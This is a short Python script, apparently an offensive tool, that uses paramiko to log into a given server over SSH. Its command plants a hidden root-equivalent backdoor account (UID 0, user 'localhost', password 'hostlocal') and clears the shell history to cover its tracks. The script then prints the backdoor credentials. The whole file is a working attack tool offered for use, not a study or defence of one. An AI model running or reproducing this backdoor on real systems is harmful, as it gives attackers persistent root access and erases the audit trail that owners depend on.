#!/usr/bin/python

'''
	Author: Mipsel / Sprite
	Date Created: August 6th, 2017
'''

#! Internal Imports !#
import os
import sys
import time

if os.name == 'posix':
	cmd = 'clear'
elif os.name == 'nt':
	cmd = 'cls'

#! External Modules
try:
	import paramiko
except ImportError:
	os.system(cmd)
	print("\033[31mERROR: Install paramiko!")

#! Color Codes !#
W  = '\033[0m'  # white (normal)
R  = '\033[31m' # red
G  = '\033[32m' # green
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[1;36m' # cyan
GR = '\033[37m' # gray
T  = '\033[93m' # tan
Y = '\e[1;33m' # yellow

#! Slowprint !#
def slowprint(s):
  for c in s + '\n':
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(8./850)

#! System Argument !#
server = sys.argv[1]
username 	  = sys.argv[2]
password 	  = sys.argv[3]


#! File Banner !#
def get_banner():
	print(R+"-" * 41)
	print(R+"|"+C+"     ______ __                       	"+R+"|"+W)
	print(R+"|"+C+"    / ____// /____ _ ____ ___   ___  	"+R+"|"+W)
	print(R+"|"+C+"   / /_   / // __ `// __ `__ \ / _ \ 	"+R+"|"+W)
	print(R+"|"+C+"  / __/  / // /_/ // / / / / //  __/ 	"+R+"|"+W)
	print(R+"|"+C+" /_/    /_/ \__,_//_/ /_/ /_/ \___/  	"+R+"|"+W)
	print(R+"-" * 41)


#! Execute SSH !#
def execute_ssh(server, username, password):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	ssh.connect(server, username=username, password=password)
	ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command('useradd -o -u 0 -g 0 -M -d /root -s /bin/bash localhost; echo -e "hostlocal\nhostlocal" | passwd localhost; history -cw; rm -rf ~/.bash_history; clear;')
	ssh.close()


#! Execute Main !#
def send_main():
	os.system(cmd)
	get_banner()
	print(R+"Beginning SSH Execution")
	time.sleep(2)
	execute_ssh(server, username, password)
	slowprint(G+"""Login Details
Server: """+server+"""
Username: localhost
Password: hostlocal
""")

send_main()
